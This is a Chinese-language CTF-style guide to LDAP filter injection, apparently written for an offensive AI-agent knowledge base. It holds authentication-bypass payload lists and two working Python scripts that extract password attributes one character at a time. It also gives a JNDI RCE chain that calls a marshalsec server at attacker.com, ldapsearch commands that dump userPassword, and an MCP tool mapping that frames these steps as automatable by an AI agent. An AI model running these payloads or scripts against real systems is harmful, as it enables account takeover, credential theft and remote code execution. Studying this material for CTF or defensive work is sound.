---
id: "ctf-website/02-auth/ldap-injection"
title: "LDAP Injection"
title_en: "LDAP Injection"
summary: >
  介绍 LDAP 过滤器注入的攻击原理，包括认证绕过、盲注逐字符提取属性值、LDAP-to-JNDI 反序列化链及 OpenLDAP 匿名绑定攻击。覆盖完整的 LDAP filter 注入 payload 字典和盲注脚本。
summary_en: >
  A guide to LDAP filter injection attacks covering authentication bypass, blind character-by-character attribute extraction, LDAP-to-JNDI deserialization chains, and OpenLDAP anonymous bind exploitation. Includes complete LDAP filter injection payloads and blind extraction scripts.
board: "ctf-website"
category: "02-auth"
signals: ["LDAP", "过滤器注入", "LDAP injection", "JNDI", "盲注", "anonymous bind", "OpenLDAP"]
mcp_tools: ["http_probe"]
keywords: ["LDAP injection", "LDAP注入", "JNDI", "filter bypass", "盲注", "anonymous bind", "认证绕过"]
difficulty: "intermediate"
tags: ["authentication", "ldap", "injection", "web-security", "jndi", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# LDAP Injection

## LDAP 过滤器注入

```python
# LDAP filter 语法: (attribute=value)
# 注入点: value 部分未转义 → 攻撃者可修改 filter 逻辑

LDAP_PAYLOADS = [
    # 认证绕过
    # 原始: (&(uid={user})(password={pass}))
    # 注入: uid=*)(|(uid=*  → (&(uid=*)(|(uid=*)(password=xxx))
    # 结果: uid 通配 + OR → 恒真 → 绕过密码
    ("*)(uid=*))(|(uid=*", "Universal bypass"),
    ("admin)(&)", "Specific user"),
    ("*)(|(password=*", "Password wildcard"),

    # 盲注 — 逐字符提取 (类似 SQL 盲注)
    # (&(uid=admin)(password=a*))  → 匹配 → 密码以 a 开头
    ("*)(password={prefix}*", "Blind prefix"),

    # AND/OR 注入
    # (&(uid=admin)(|(department=IT)(department=HR))) → 多部门访问
    ("admin)(|(department=IT", "OR injection"),
]
```

### 1.1 LDAP Filter 语法速查

| 语法 | 含义 | 注入价值 |
|---|---|---|
| `(uid=admin)` | 等值匹配 | 闭合属性值 |
| `(uid=adm*)` | 通配前缀 | 盲注抽取 |
| `(&(a=b)(c=d))` | AND | 加条件/截断后续 |
| `(|(a=b)(c=d))` | OR | 认证绕过 |
| `(!(a=b))` | NOT | 反向判断 |
| `(mail=*)` | 属性存在 | 枚举字段 |
| `(memberOf=cn=admin,...)` | 组成员 | 权限过滤 |

特殊字符转义：

```text
*  -> \2a
(  -> \28
)  -> \29
\  -> \5c
NUL -> \00
```

如果输入 `*` 后结果变多，说明通配符未转义；输入 `)` 后 filter 报错，说明可闭合表达式；输入 `\2a` 后按星号匹配，说明服务端可能二次 decode。

### 1.2 常见认证 Filter 形态

| 原始 Filter | 用户名 payload | 效果 |
|---|---|---|
| `(&(uid={u})(password={p}))` | `*)(uid=*))(|(uid=*` | OR 恒真 |
| `(&(mail={u})(userPassword={p}))` | `admin@example.com)(` | 截断/报错定位 |
| `(&(objectClass=user)(sAMAccountName={u}))` | `*)(memberOf=CN=Admins,*` | AD 组过滤 |
| `(|(uid={u})(mail={u}))` | `*)(userPassword=*)` | 扩展 OR 分支 |
| `(cn={q}*)` | `*)(|(cn=admin*)` | 搜索结果扩展 |

命中样本：登录成功、搜索结果数量增加、错误包含 `Bad search filter`、响应时间随前缀匹配变化。

## LDAP 盲注脚本

```python
# ldap_blind.py — 逐字符提取 LDAP 属性
import requests, string

def ldap_blind_extract(target: str, attribute: str = "password"):
    """通过 LDAP filter 盲注提取属性值"""
    charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+"
    extracted = ""

    while True:
        for ch in charset:
            test = extracted + ch
            # 构造盲注 filter
            # 原始: (&(uid=admin)(password={test}*))
            payload = f"*)({attribute}={test}*"
            r = requests.post(f"{target}/login", data={
                "username": payload,
                "password": "anything"
            })
            # 如果登录成功 → 匹配前缀
            if "Welcome" in r.text or r.status_code == 200:
                extracted = test
                print(f"[+] {attribute} = {extracted}")
                break
        else:
            break  # 没有更多字符
    return extracted
```

### 2.1 稳定盲注判定

```python
import string
import requests

ALPHABET = string.ascii_letters + string.digits + "_-@.{}:$!#"

def oracle(resp):
    text = resp.text.lower()
    if "welcome" in text or "logout" in text or resp.status_code in (302, 303):
        return True
    if "invalid" in text or "not found" in text or "bad search filter" in text:
        return False
    return len(resp.text) > 1000

def ldap_prefix_extract(url, attr="mail", base_user="admin", max_len=64):
    prefix = ""
    for _ in range(max_len):
        for ch in ALPHABET:
            payload = f"{base_user})({attr}={prefix + ch}*"
            r = requests.post(url, data={"username": payload, "password": "x"}, timeout=8)
            if oracle(r):
                prefix += ch
                print(prefix)
                break
        else:
            return prefix
    return prefix
```

如果 response oracle 不稳定，改用搜索页结果数量、分页总数、是否出现特定用户名，或者让 filter 在 True 分支匹配 `uid=admin`、False 分支匹配不存在用户。

## LDAP → JNDI 反序列化 (Java)

```python
# 如果 LDAP 注入点传给 Java 的 InitialDirContext:
# 可以返回指向恶意 LDAP 服务器的引用 → JNDI 反序列化 → RCE

# 前提:
# 1. com.sun.jndi.ldap.object.trustURLCodebase = true (Java 8u191 前默认)
# 2. 或利用本地 gadget 链 (更高版本)

# 恶意 LDAP 服务器 (marshalsec)
# java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \
#   http://attacker.com/#Exploit 1389

# 注入 payload:
# ${jndi:ldap://attacker.com:1389/Exploit}
```

## OpenLDAP 特定攻击

```bash
# Anonymous bind — 匿名绑定读所有条目
ldapsearch -x -H ldap://ldap.target.com -b "dc=target,dc=com" "(objectClass=*)"

# 如果无密码策略 → 读所有用户和属性
ldapsearch -x -H ldap://ldap.target.com -b "dc=target,dc=com" \
  "(&(objectClass=person)(uid=*))" uid userPassword mail
```

### Active Directory / OpenLDAP 属性字典

| 目标 | AD 属性 | OpenLDAP 属性 |
|---|---|---|
| 用户名 | `sAMAccountName`, `userPrincipalName` | `uid`, `cn` |
| 邮箱 | `mail` | `mail` |
| 组 | `memberOf` | `memberOf`, `gidNumber` |
| 密码哈希 | `unicodePwd` 不可读，`pwdLastSet` | `userPassword` |
| 状态 | `userAccountControl` | `shadowExpire`, `pwdAccountLockedTime` |
| 描述 | `description`, `info` | `description` |

高价值查询：

```bash
ldapsearch -x -H ldap://target -b "dc=target,dc=com" "(|(uid=admin)(cn=admin)(sAMAccountName=admin))"
ldapsearch -x -H ldap://target -b "dc=target,dc=com" "(|(memberOf=*admin*)(description=*flag*))"
ldapsearch -x -H ldap://target -b "dc=target,dc=com" "(userPassword=*)" uid userPassword
```

CTF 常见 flag 位置：`description`、`info`、`mail`、自定义属性、组名、OU 名称、`userPassword` 明文/弱 hash。

## 攻击链

```
LDAP injection → 认证绕过 → 后台 → RCE
LDAP blind → 提取 userPassword → crack → 凭据重用
LDAP → JNDI reference → 反序列化 → Java RCE
OpenLDAP anonymous bind → 全量数据导出 → 账号枚举 → 密码喷射
LDAP filter injection → (&(uid=*)(memberOf=cn=admin,ou=groups)) → 提权
```

## Evidence

记录: 原始 filter 形态推断、payload、响应差异、搜索结果数量、盲注字符日志、提取出的属性值、LDAP banner/base DN、JNDI 外连日志、成功样本和失败样本。

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| LDAP 注入端点探测 | `http_probe` | HTTP GET 探测 LDAP 查询端点 |
